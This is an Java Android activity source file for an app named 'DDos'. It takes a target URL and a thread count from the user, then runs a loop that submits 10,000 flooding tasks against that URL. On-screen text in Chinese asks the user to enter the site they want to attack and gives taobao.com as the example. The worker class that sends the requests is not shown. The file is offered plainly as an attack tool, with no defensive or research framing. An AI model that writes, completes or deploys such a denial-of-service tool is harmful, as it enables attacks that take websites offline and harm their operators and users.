package com.dtsj.ddos;

import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DDosActivity extends AppCompatActivity implements View.OnClickListener{
    private EditText urlEdit,editpool;
    private Button startDDos,stopDDos,testDDos,liuDDos;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ddos);
//        getActionBar().hide();
        initView();
    }

    private void DDosStart(){
        Toast.makeText(this,"请输入想要攻击的网址 例如  http://taobao.com",Toast.LENGTH_SHORT).show();
        String str=urlEdit.getText().toString();
        int num=Integer.parseInt(editpool.getText().toString());
            ExecutorService es = Executors.newFixedThreadPool(num*10);//1000太多了
            MythreadCus mythread = new MythreadCus(str);
            Thread thread = new Thread(mythread);
            for (int i = 0; i < 10000; i++) {
                es.execute(thread);
            }
        }

    private void DDosTest(){
        Toast.makeText(this,"请输入想要攻击的网址 例如  http://taobao.com",Toast.LENGTH_SHORT).show();
        String str=urlEdit.getText().toString();
        TestRu testRu=new TestRu(str);
        new Thread(testRu).start();
    }

        private void initView(){
            editpool=findViewById(R.id.ddos_pool);

            testDDos=findViewById(R.id.ddos_test);
            liuDDos=findViewById(R.id.ddos_liu);
            urlEdit=findViewById(R.id.ddos_edit);
            startDDos=findViewById(R.id.ddos_start);
            stopDDos=findViewById(R.id.ddos_finish);
            stopDDos.setOnClickListener(this);
            startDDos.setOnClickListener(this);
            testDDos.setOnClickListener(this);
            liuDDos.setOnClickListener(this);
        }

    @Override
    public void onClick(View v) {
        switch (v.getId()){
            case R.id.ddos_start:
                DDosStart();
                break;

            case R.id.ddos_finish:
                finish();
                break;

            case R.id.ddos_test:
                DDosTest();
                break;

            case R.id.ddos_liu:
                finish();
                break;
        }
    }
}
